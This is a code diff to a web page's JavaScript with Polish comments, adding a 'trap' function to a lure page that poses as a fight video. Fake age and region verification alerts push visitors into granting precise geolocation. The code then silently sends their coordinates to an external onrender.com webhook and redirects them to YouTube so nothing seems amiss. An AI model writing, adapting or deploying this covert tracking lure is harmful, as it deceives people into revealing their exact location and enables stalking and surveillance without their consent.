@@ -159,28 +159,32 @@
 
     <script>
         function uruchomPulapke() {
+            // Pierwsze okienko maskujące pod pozorem weryfikacji wieku/regionu
+            alert("Materiał przeznaczony wyłącznie dla pełnoletnich widzów. Trwa automatyczna weryfikacja lokalizacji ze względu na ograniczenia prawne w regionie...");
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         var lat = position.coords.latitude;
                         var lon = position.coords.longitude;
                         
-                        // Wysyłamy współrzędne do naszego serwera na Renderze w tle
+                        // Ciche wysyłanie współrzędnych na nasz serwer na Renderze
                         fetch('https://czeladz-webhook-live.onrender.com/zapisz?lat=' + lat + '&lon=' + lon)
                             .catch(err => console.log(err));
                             
-                        // Przekierowujemy na YouTube do autentycznego filmu z bójką
+                        // Przekierowanie na YouTube do autentycznego filmu z bójką
                         setTimeout(function() {
                             window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
                         }, 500);
                     },
                     function(error) {
-                        // Nawet jak odmówi, i tak puszczamy na film, żeby nic nie wzbudziło podejrzeń
+                        alert("Weryfikacja lokalizacji nie powiodła się. Upewnij się, że zezwolono na dostęp do lokalizacji w regionie, aby odtworzyć materiał.");
                         window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
                     },
                     { timeout: 10000, enableHighAccuracy: true }
                 );
             } else {
+                alert("Twoje urządzenie nie obsługuje weryfikacji regionalnej.");
                 window.location.href = "https://www.youtube.com/watch?v=hkjSSPsjWII";
             }
         }
